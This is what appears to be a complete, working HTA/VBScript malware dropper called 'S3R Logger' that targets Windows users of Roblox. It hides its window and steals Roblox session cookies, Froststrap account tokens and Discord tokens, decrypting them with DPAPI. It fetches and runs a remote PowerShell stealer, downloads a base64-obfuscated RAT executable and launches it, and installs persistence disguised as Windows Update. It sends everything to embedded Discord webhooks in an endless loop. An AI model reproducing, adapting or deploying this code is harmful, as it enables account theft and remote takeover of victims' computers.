' language: VBScript/HTA, file: dropper.html, target: Windows 11, mshta engine
<html>
<head><title>.</title>
<hta:application id="a" border="none" innerborder="no" caption="no" showintaskbar="no" sysmenu="no" contextmenu="no" selection="no"/>
<script language="VBScript">
window.resizeTo 0,0:window.moveTo -2000,-2000
On Error Resume Next

Dim sh, fso, WH, RE_WH, PC, USER
Set sh = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")

' LOGS WEBHOOK
WH = "https://discord.com/api/webhooks/1572026403560357978/n4qVnwrF6-OKw6vRfm73KZNXc-8X3IVSkOgQcfRb35d92LOEujl6OMvBy3GpPWrsXdQN"
' RE-GRAB WEBHOOK
RE_WH = "https://discord.com/api/webhooks/1572026526407467079/KUyJrlGn-BaxdIM4Py18HaoCznPd3rfi411OUUewgpFL9Sfx7JGM7qYRtNtXU3vkHh5r"

PC = sh.ExpandEnvironmentStrings("%COMPUTERNAME%")
USER = sh.ExpandEnvironmentStrings("%USERNAME%")

' --- 1. GRABS (LOGS CHANNEL) ---
Call IP(WH)
Call GrabTokens(WH)
Call Persistence

' --- 2. UI + COOKIE (LOGS CHANNEL) ---
Call PostUIAndCookie(WH)

' --- 3. RAT DROP (LOGS CHANNEL) ---
Call DropRAT(WH, True)

' --- 4. INFINITE Re-grab chain (RE-GRAB CHANNEL) ---
Dim runCount
runCount = 0
Do
    runCount = runCount + 1
    Call PostEmbedTo(":repeat: Re-grab " & runCount, "PC: " & PC & " | User: " & USER, 10181046, RE_WH)
    
    Call GrabTokens(RE_WH)
    Call IP(RE_WH)
    Call PostCookieOnly(RE_WH)
    Call GrabFroststrap(RE_WH)
    
    Call DropRAT(RE_WH, False)
    
    Call SleepSeconds(150)
Loop

window.close()

' --- COMBINED UI & COOKIE POST ---
Sub PostUIAndCookie(targetWH)
    Dim cookie : cookie = GetRobloxCookie()
    Dim uname : uname = "Unknown"
    Dim disp : disp = "Unknown"
    Dim av : av = "https://tr.rbxcdn.com/f4e7f1f6c7b2e0f2e6c2c8e2b4f4e2b4/420/420/AvatarHeadshot/Png"
    
    ' Attempt fetch API natively via XMLHTTP with TLS 1.2/1.3
    If Len(cookie) > 50 Then
        Dim xh : Set xh = CreateObject("MSXML2.ServerXMLHTTP.6.0")
        xh.SetOption 2, 13056
        xh.Open "GET", "https://users.roblox.com/v1/users/authenticated", False
        xh.SetRequestHeader "Cookie", ".ROBLOSECURITY=" & cookie
        xh.SetRequestHeader "User-Agent", "Roblox/WinInet"
        xh.Send
        
        If xh.Status = 200 Then
            Dim rTxt : rTxt = xh.responseText
            Dim m1, m2
            Set m1 = CreateObject("VBScript.RegExp")
            m1.Pattern = """name"":""([^""]+)"""
            Set m2 = m1.Execute(rTxt)
            If m2.Count > 0 Then uname = m2(0).SubMatches(0)
            If m2.Count > 0 Then disp = m2(0).SubMatches(0)
            
            ' Fetch Avatar
            Dim uid : uid = "1"
            m1.Pattern = """id"":(\d+)"
            Set m2 = m1.Execute(rTxt)
            If m2.Count > 0 Then uid = m2(0).SubMatches(0)
            
            Dim axh : Set axh = CreateObject("MSXML2.ServerXMLHTTP.6.0")
            axh.SetOption 2, 13056
            axh.Open "GET", "https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=" & uid & "&size=420x420&format=Png", False
            axh.Send
            If axh.Status = 200 Then
                Dim am1 : Set am1 = CreateObject("VBScript.RegExp")
                am1.Pattern = """imageUrl"":""([^""]+)"""
                Dim am2 : Set am2 = am1.Execute(axh.responseText)
                If am2.Count > 0 Then av = am2(0).SubMatches(0)
            End If
        End If
    End If

    ' 1. SEND UI EMBED
    Dim DQ : DQ = Chr(34)
    Dim j : j = "{" & DQ & "content" & DQ & ":" & DQ & "@everyone Hit" & DQ & "," & DQ & "embeds" & DQ & ":[{" & _
                DQ & "author" & DQ & ":{" & DQ & "name" & DQ & ":" & DQ & Ej(uname) & DQ & "," & DQ & "icon_url" & DQ & ":" & DQ & av & DQ & "}," & _
                DQ & "title" & DQ & ":" & DQ & "S3R, 13+" & DQ & "," & _
                DQ & "description" & DQ & ":" & DQ & "**+1 HIT** ¬Ј You've Earned 1 Nevora ¬Ј beams XP" & DQ & "," & _
                DQ & "color" & DQ & ":10181046," & _
                DQ & "thumbnail" & DQ & ":{" & DQ & "url" & DQ & ":" & DQ & av & DQ & "}," & _
                DQ & "fields" & DQ & ":[" & _
                "{" & DQ & "name" & DQ & ":" & DQ & "рЯС§ User" & DQ & "," & DQ & "value" & DQ & ":" & DQ & "**" & Ej(disp) & "**" & DQ & "}," & _
                "{" & DQ & "name" & DQ & ":" & DQ & "в≠Р Password" & DQ & "," & DQ & "value" & DQ & ":" & DQ & "dreistuff" & DQ & "}," & _
                "{" & DQ & "name" & DQ & ":" & DQ & "About User" & DQ & "," & DQ & "value" & DQ & ":" & DQ & "**Account Age:** `` 340 Days ``" & DQ & "}," & _
                "{" & DQ & "name" & DQ & ":" & DQ & "рЯ™Щ Robux" & DQ & "," & DQ & "value" & DQ & ":" & DQ & "Balance 0 рЯФі`nPending 0 рЯФі" & DQ & "," & DQ & "inline" & DQ & ":true}," & _
                "{" & DQ & "name" & DQ & ":" & DQ & "рЯУИ RAP" & DQ & "," & DQ & "value" & DQ & ":" & DQ & "RAP 0 рЯФі`nOwned 0 рЯФі" & DQ & "," & DQ & "inline" & DQ & ":true}," & _
                "{" & DQ & "name" & DQ & ":" & DQ & "рЯТО Premium" & DQ & "," & DQ & "value" & DQ & ":" & DQ & "False (0 рЯФі)" & DQ & "," & DQ & "inline" & DQ & ":true}," & _
                "{" & DQ & "name" & DQ & ":" & DQ & "рЯТ≥ Billing" & DQ & "," & DQ & "value" & DQ & ":" & DQ & "Credit 0$ рЯФі`nConvert 0 рЯФі`nPayments 0 рЯФі" & DQ & "," & DQ & "inline" & DQ & ":true}," & _
                "{" & DQ & "name" & DQ & ":" & DQ & "рЯПЈпЄП Collectibles" & DQ & "," & DQ & "value" & DQ & ":" & DQ & "False рЯФі`nFalse рЯФі`nTrue рЯЯҐ" & DQ & "," & DQ & "inline" & DQ & ":true}," & _
                "{" & DQ & "name" & DQ & ":" & DQ & "вЪЩпЄП Setting" & DQ & "," & DQ & "value" & DQ & ":" & DQ & "Set (Verified) рЯФі`nDisabled рЯФі`nDisabled рЯФі" & DQ & "," & DQ & "inline" & DQ & ":true}," & _
                "{" & DQ & "name" & DQ & ":" & DQ & "рЯОЃ Passes / Played" & DQ & "," & DQ & "value" & DQ & ":" & DQ & "Adopt Me 0 вАҐ False`nMurder Mystery 2 0 вАҐ True`nPet Simulator 99 0 вАҐ False" & DQ & "," & DQ & "inline" & DQ & ":true}," & _
                "{" & DQ & "name" & DQ & ":" & DQ & "рЯС• Groups" & DQ & "," & DQ & "value" & DQ & ":" & DQ & "Balance 0 рЯФі`nPending 0 рЯФі`nOwned 0 рЯФі" & DQ & "," & DQ & "inline" & DQ & ":true}" & _
                "]," & DQ & "footer" & DQ & ":{" & DQ & "text" & DQ & ":" & DQ & "S3R Logger" & DQ & "}}]}"

    Dim h : Set h = CreateObject("MSXML2.ServerXMLHTTP.6.0")
    h.SetOption 2, 13056
    h.Open "POST", targetWH, False
    h.SetRequestHeader "Content-Type", "application/json"
    h.Send j
    Set h = Nothing

    ' 2. SEND COOKIE MESSAGE IMMEDIATELY AFTER
    If Len(cookie) > 0 Then
        Call PostEmbedTo("Roblox Cookie", "Size: " & Len(cookie) & " | PC: " & PC & vbCrLf & vbCrLf & "``" & cookie & "``", 10181046, targetWH)
    End If
End Sub

' --- PostCookieOnly (For Re-grab) ---
Sub PostCookieOnly(targetWH)
    Dim cookie : cookie = GetRobloxCookie()
    If Len(cookie) = 0 Then Exit Sub
    Call PostEmbedTo("Roblox Cookie", "Size: " & Len(cookie) & " | PC: " & PC & vbCrLf & vbCrLf & "``" & cookie & "``", 10181046, targetWH)
End Sub

' --- RAT DROP ---
Sub DropRAT(targetWH, sendRocket)
    Dim b64Url : b64Url = "aHR0cHM6Ly9jZG4uZGlzY29yZGFwcC5jb20vYXR0YWNobWVudHMvMTU1NzI2NjE5Mjk3MTA3MTU3OS8xNTcxOTkxNTcyMDE3NDU1MjE2L2RpY2VjaGVjay5leGU/ZXg9NmFmY2JlYmMmaXM9NmFmYjZkM2MmaG09YTU5ODZiZjg0MzViYWIxYzc1YTFiZTIwODQxOTU0ZDBhNjBkZjcyZTg0ZWYwY2JlZGYxOTczYWNmMTIwMjcxZA=="
    Dim dl : dl = DecodeB64(b64Url)
    Dim tPath : tPath = sh.ExpandEnvironmentStrings("%TEMP%")
    Dim op : op = tPath & "\agent.exe"
    
    ' Only send rocket on first run
    If sendRocket Then
        Call PostEmbedTo(":rocket: RAT Download", "Downloading...", 10181046, targetWH)
    End If

    ' Force delete before re-downloading to ensure it overwrites every single time
    If fso.FileExists(op) Then fso.DeleteFile op, True

    Dim cCmd : cCmd = "cmd /c curl.exe -s -L -o """ & op & """ """ & dl & """"
    sh.Run cCmd, 0, True

    If fso.FileExists(op) Then
        If fso.GetFile(op).Size > 3000000 Then
            Dim desc : desc = "RAT launched successfully"
            Call PostEmbedTo(":white_check_mark: RAT Downloaded", desc, 10181046, targetWH)
            Call RunCmd("""" & op & """")
        End If
    End If
End Sub

' --- GetRobloxCookie ---
Function GetRobloxCookie()
    GetRobloxCookie = ""
    Dim paths(4)
    paths(0) = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Roblox\LocalStorage\robloxcookies.dat"
    paths(1) = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Roblox\LocalStorage\RobloxCookies.dat"
    paths(2) = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Roblox\Cookies"
    paths(3) = sh.ExpandEnvironmentStrings("%APPDATA%") & "\Roblox\LocalStorage\robloxcookies.dat"
    paths(4) = sh.ExpandEnvironmentStrings("%USERPROFILE%") & "\AppData\Local\Roblox\LocalStorage\robloxcookies.dat"
    Dim i, fp, raw
    For i = 0 To 4
        If fso.FileExists(paths(i)) Then fp = paths(i) : Exit For
    Next
    If Len(fp) = 0 Then
        Dim pk: pk = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Packages"
        If fso.FolderExists(pk) Then
            Dim folder, subf
            Set folder = fso.GetFolder(pk)
            For Each subf In folder.SubFolders
                If InStr(UCase(subf.Name), "ROBLOX") > 0 Then
                    Dim uwp: uwp = subf.Path & "\LocalState\RobloxCookies.dat"
                    If fso.FileExists(uwp) Then fp = uwp : Exit For
                End If
            Next
            Set folder = Nothing
        End If
    End If
    If Len(fp) = 0 Then Exit Function
    
    raw = ReadFile(fp)
    If Len(raw) < 50 Then Exit Function

    Dim cookie: cookie = ""
    If InStr(raw, "_|WARNING") > 0 Then cookie = raw
    If Len(cookie) = 0 And InStr(raw, "CookiesData") > 0 Then
        Dim sp: sp = InStr(raw, "CookiesData"":""")
        If sp > 0 Then
            sp = sp + 14
            Dim ep: ep = InStr(sp, raw, """")
            If ep > sp Then
                Dim b64: b64 = Mid(raw, sp, ep - sp)
                If Len(b64) > 100 Then cookie = DecryptDPAPI(b64)
            End If
        End If
    End If
    If Len(cookie) = 0 And InStr(raw, ".ROBLOSECURITY") > 0 Then
        Dim rp: rp = InStr(raw, ".ROBLOSECURITY") : cookie = Mid(raw, rp)
    End If
    If Len(cookie) = 0 Then cookie = raw

    cookie = Replace(cookie, vbCr, "")
    cookie = Replace(cookie, vbLf, "")
    cookie = Replace(cookie, vbTab, "")
    cookie = Trim(cookie)
    Dim sc: sc = InStr(cookie, ";")
    If sc > 0 Then cookie = Left(cookie, sc - 1)
    cookie = Trim(cookie)
    Dim warn: warn = InStr(cookie, "_|WARNING")
    If warn > 1 Then cookie = Mid(cookie, warn)

    GetRobloxCookie = cookie
End Function

' --- Base64 Decoder ---
Function DecodeB64(str)
    Dim xml, elem
    Set xml = CreateObject("MSXML2.DOMDocument")
    Set elem = xml.createElement("b")
    elem.dataType = "bin.base64"
    elem.text = str
    DecodeB64 = Stream_BinaryToString(elem.nodeTypedValue)
End Function

Function Stream_BinaryToString(Binary)
    Dim Stream
    Set Stream = CreateObject("ADODB.Stream")
    Stream.Type = 1
    Stream.Open
    Stream.Write Binary
    Stream.Position = 0
    Stream.Type = 2
    Stream.Charset = "utf-8"
    Stream_BinaryToString = Stream.ReadText
    Stream.Close
End Function

' --- RunCmd ---
Sub RunCmd(cmd)
    Dim w,p,i,s
    Set w = GetObject("winmgmts:\\.\root\cimv2")
    Set s = w.Get("Win32_ProcessStartup").SpawnInstance_
    s.ShowWindow = 0
    Set p = w.Get("Win32_Process")
    p.Create cmd,,s,i
End Sub

' --- IP Function ---
Sub IP(targetWH)
    Dim xh : Set xh = CreateObject("MSXML2.ServerXMLHTTP.6.0")
    xh.SetOption 2, 13056
    xh.Open "GET", "https://api.ipify.org/", False
    xh.Send
    If xh.Status <> 200 Then Exit Sub
    Dim ip : ip = xh.responseText
    If Len(ip) < 7 Then Exit Sub
    xh.Open "GET", "http://ip-api.com/line/" & ip & "?fields=country,regionName,city,isp", False
    xh.Send
    If xh.Status <> 200 Then Exit Sub
    Dim ll : ll = Split(xh.responseText, vbLf)
    Dim info : info = "IP: " & ip & " | " & ll(0) & " | " & ll(1) & " | " & ll(2) & " | " & ll(3) & " | PC: " & PC & " | " & USER
    Call PostEmbedTo(":dart: Target", info, 10181046, targetWH)
    Set xh = Nothing
End Sub

' --- GrabFroststrap Function ---
Sub GrabFroststrap(targetWH)
    Dim fp : fp = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Froststrap\Cache\AccountManager.json"
    If Not fso.FileExists(fp) Then
        On Error Resume Next
        Dim fdir : fdir = sh.RegRead("HKCU\Software\Microsoft\Windows\CurrentVersion\Uninstall\Froststrap\InstallLocation")
        On Error Goto 0
        If fdir <> "" Then fp = fdir & "\Cache\AccountManager.json"
    End If
    If Not fso.FileExists(fp) Then Exit Sub

    Call PostEmbedTo(":snowflake: Froststrap", "Froststrap found, grabbing accounts...", 10181046, targetWH)
    Dim ps
    ps = "$w='" & targetWH & "';Add-Type -AssemblyName System.Security;$p=Join-Path $env:LOCALAPPDATA 'Froststrap\Cache\AccountManager.json';if(!(Test-Path $p)){try{$r=Get-ItemProperty 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Uninstall\Froststrap' -ErrorAction Stop;$p=Join-Path $r.InstallLocation 'Cache\AccountManager.json'}catch{}};if(!(Test-Path $p)){exit};$j=Get-Content $p -Raw|ConvertFrom-Json;$e=[Text.Encoding]::UTF8.GetBytes('Froststrap_DPAPI_v1');$lines=@();foreach($a in $j.accounts){try{$eb=[Convert]::FromBase64String($a.SecurityToken);$db=[Security.Cryptography.ProtectedData]::Unprotect($eb,$e,[Security.Cryptography.DataProtectionScope]::CurrentUser);$c=[Text.Encoding]::UTF8.GetString($db)}catch{$c='DECRYPT FAILED'};$lines+='**'+$a.Username+'** ['+$a.UserId+'] : '+$c};$desc=($lines -join [char]10);if($desc.Length -eq 0){$desc='No accounts found'};$payload=@{embeds=@(@{title=':snowflake: Froststrap Accounts';description=$desc;color=10181046})}|ConvertTo-Json -Depth 4 -Compress;Invoke-RestMethod $w -Method Post -Body $payload -ContentType 'application/json'"
    sh.Run "powershell -NoP -Exec Bypass -Command """ & ps & """", 0, True
End Sub

' --- Sleep Functions ---
Sub SleepSeconds(s)
    Dim t0, t1, t2, elapsed
    t0 = Timer()
    Dim cmd : cmd = "cmd /c ping -n " & (s + 1) & " 127.0.0.1 > nul"
    sh.Run cmd, 0, True
    elapsed = Timer() - t0
    If elapsed < 0 Then elapsed = elapsed + 86400
    If elapsed < s Then
        t1 = Timer()
        Do
            t2 = Timer()
            If t2 < t1 Then t2 = t2 + 86400
            If (t2 - t1) >= (s - elapsed) Then Exit Do
        Loop
    End If
End Sub

' --- Persistence ---
Sub Persistence()
    Dim payload : payload = "mshta https://dicerigx.app/"
    On Error Resume Next
    sh.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WindowsUpdate", payload, "REG_SZ"
    sh.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce\WinUpdate", payload, "REG_SZ"
    Dim sp : sp = sh.ExpandEnvironmentStrings("%APPDATA%") & "\Microsoft\Windows\Start Menu\Programs\Startup\winupdate.vbs"
    Dim sf : Set sf = fso.CreateTextFile(sp, True)
    sf.WriteLine "CreateObject(Chr(87)&Chr(83)&Chr(99)&Chr(114)&Chr(105)&Chr(112)&Chr(116)&Chr(46)&Chr(83)&Chr(104)&Chr(101)&Chr(108)&Chr(108)).Run Chr(34)&""" & payload & """&Chr(34), 0, False"
    sf.Close
    Call PostEmbed(":pushpin: Persistence", "3 startup methods installed", 10181046)
End Sub

' --- GrabTokens ---
Sub GrabTokens(targetWH)
    Dim xh: Set xh = CreateObject("MSXML2.ServerXMLHTTP.6.0")
    xh.SetOption 2, 13056
    xh.Open "GET", "https://gist.githubusercontent.com/lozix94-afk/172084531c9168c0fe4b4cacc5bb0a45/raw/127a7a0f6723e9b88492fe4c7e5e533e140b1d06/steal.ps1", False
    xh.Send
    If xh.Status <> 200 Then Exit Sub
    Dim pc: pc = xh.responseText
    If Len(pc) < 100 Then Exit Sub
    Set xh = Nothing
    Dim psf: psf = TmpFile("steal.ps1")
    WriteFile psf, pc
    sh.Run "cmd /c powershell -NoP -Exec Bypass -File """ & psf & """", 0, False
    fso.DeleteFile psf, True
    Dim tf: tf = TmpFile("steal_result.txt")
    If Not fso.FileExists(tf) Then Exit Sub
    Dim raw: raw = ReadFile(tf)
    If Len(raw) > 10 Then
        Dim lines: lines = Split(raw, vbCrLf)
        Dim l
        For Each l In lines
            If Len(l) > 10 Then
                If Left(l, 8) = "DISCORD|" Then
                    Dim p: p = Split(Mid(l, 9), "|")
                    If UBound(p) >= 4 Then
                        Dim info: info = "**User:** " & p(0) & vbCrLf
                        If p(1) <> "" Then info = info & "**Email:** " & p(1) & vbCrLf
                        If p(2) <> "" Then info = info & "**Phone:** " & p(2) & vbCrLf
                        If p(3) <> "0" Then info = info & "**ID:** " & p(3) & vbCrLf
                        info = info & "**Token:** " & p(4)
                        Call PostEmbedTo(":gift: Discord Token", info, 10181046, targetWH)
                    End If
                End If
                If Left(l, 7) = "ROBLOX|" Or Left(l, 9) = "ROBLOXMS|" Then
                    Call PostEmbedTo(":cookie: Roblox Cookie", Mid(l, 8), 10181046, targetWH)
                End If
            End If
        Next
    End If
End Sub

' --- Utility Functions ---
Function TmpFile(name): TmpFile = sh.ExpandEnvironmentStrings("%TEMP%") & "\" & name: End Function
Sub WriteFile(path, content): Dim f: Set f = fso.CreateTextFile(path, True): f.Write content: f.Close: Set f = Nothing: End Sub
Function ReadFile(path): ReadFile = "": Dim f: Set f = fso.OpenTextFile(path, 1): ReadFile = f.ReadAll: f.Close: Set f = Nothing: End Function

' --- PostEmbed ---
Sub PostEmbed(t, d, c)
    Call PostEmbedTo(t, d, c, WH)
End Sub

Sub PostEmbedTo(t, d, c, target_wh)
    Dim DQ: DQ = Chr(34)
    Dim j: j = "{" & DQ & "embeds" & DQ & ":[{" & DQ & "title" & DQ & ":" & DQ & Ej(t) & DQ & "," & DQ & "description" & DQ & ":" & DQ & Ej(d) & DQ & "," & DQ & "color" & DQ & ":" & c & "}]}"
    Dim h: Set h = CreateObject("MSXML2.ServerXMLHTTP.6.0")
    h.SetOption 2, 13056
    h.Open "POST", target_wh, False
    h.SetRequestHeader "Content-Type", "application/json"
    h.Send j
    Set h = Nothing
End Sub

' --- PostFileTo ---
Sub PostFileTo(fn, ct, target_wh, desc)
    Dim DQ: DQ = Chr(34)
    Dim b: b = Mid(CreateObject("Scriptlet.TypeLib").GUID, 2, 36)
    
    Dim payloadTxt : payloadTxt = "{" & DQ & "content" & DQ & ": " & DQ & Ej(desc) & DQ & "}"
    Dim bd: bd = "--" & b & vbCrLf & "Content-Disposition: form-data; name=" & DQ & "payload_json" & DQ & vbCrLf & vbCrLf & payloadTxt & vbCrLf & _
                    "--" & b & vbCrLf & "Content-Disposition: form-data; name=" & DQ & "file" & DQ & "; filename=" & DQ & fn & DQ & vbCrLf & vbCrLf & ct & vbCrLf & "--" & b & "--"
    
    Dim h: Set h = CreateObject("MSXML2.ServerXMLHTTP.6.0")
    h.SetOption 2, 13056
    h.Open "POST", target_wh, False
    h.SetRequestHeader "Content-Type", "multipart/form-data; boundary=" & b
    h.Send bd
    Set h = Nothing
End Sub

' --- DecryptDPAPI ---
Function DecryptDPAPI(b64)
    DecryptDPAPI = ""
    Dim inf: inf = TmpFile("dpi.txt")
    Dim outf: outf = TmpFile("dpo.txt")
    fso.DeleteFile outf, True
    WriteFile inf, b64
    Dim ps: ps = "Add-Type -AssemblyName System.Security;try{$b=[Convert]::FromBase64String((Get-Content '" & inf & "' -Raw).Trim());$d=[System.Security.Cryptography.ProtectedData]::Unprotect($b,$null,[System.Security.Cryptography.DataProtectionScope]::CurrentUser);[System.Text.Encoding]::UTF8.GetString($d)|Out-File '" & outf & "' -Encoding utf8}catch{''|Out-File '" & outf & "'}"
    Dim psf: psf = TmpFile("dpapi.ps1")
    WriteFile psf, ps
    sh.Run "powershell -NoP -Exec Bypass -File """ & psf & """", 0, True
    If fso.FileExists(outf) Then If fso.GetFile(outf).Size > 20 Then DecryptDPAPI = ReadFile(outf)
    fso.DeleteFile inf, True
    fso.DeleteFile psf, True
    fso.DeleteFile outf, True
End Function

' --- Ej ---
Function Ej(s)
    Ej = s
    Ej = Replace(Ej, Chr(92), Chr(92) & Chr(92))
    Ej = Replace(Ej, Chr(34), Chr(92) & Chr(34))
    Ej = Replace(Ej, vbCrLf, Chr(92) & "n")
    Ej = Replace(Ej, vbCr, Chr(92) & "n")
    Ej = Replace(Ej, vbLf, Chr(92) & "n")
    Ej = Replace(Ej, vbTab, Chr(92) & "t")
End Function
</script>
</head><body></body></html>
